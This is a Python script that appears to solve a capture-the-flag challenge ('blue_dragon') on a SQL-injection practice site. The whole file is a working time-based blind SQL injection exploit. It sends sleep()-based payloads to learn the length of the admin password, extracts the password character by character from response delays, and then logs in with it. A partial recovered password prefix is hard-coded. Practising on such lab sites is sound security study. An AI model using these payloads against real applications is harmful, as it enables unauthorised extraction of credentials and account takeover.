import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"

pw_len = None
prefix = ""


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        res, elapsed = make_request(chall_url, "?id=" +
                                    urllib.parse.quote(f"' or if(id='admin' and pw like '{prefix + c}%',sleep(1),0)#"),
                                    return_elapsed=True)
        if elapsed > 1.4:
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


pw_len = 8
prefix = "d948b8a0"

if pw_len is None:
    for i in range(40):
        res, elapsed = make_request(chall_url, "?id=" +
                                    urllib.parse.quote(f"' or if(id='admin' and length(pw)={i},sleep(1),0)#"),
                                    return_elapsed=True)
        if elapsed > 1.4:
            print("Found pw length:", i)
            pw_len = i
            break
    assert pw_len

while len(prefix) < pw_len:
    prefix = find_char(prefix)
    assert prefix

res = make_request(chall_url, f"?id=admin&pw={prefix}")
check_clear(res)
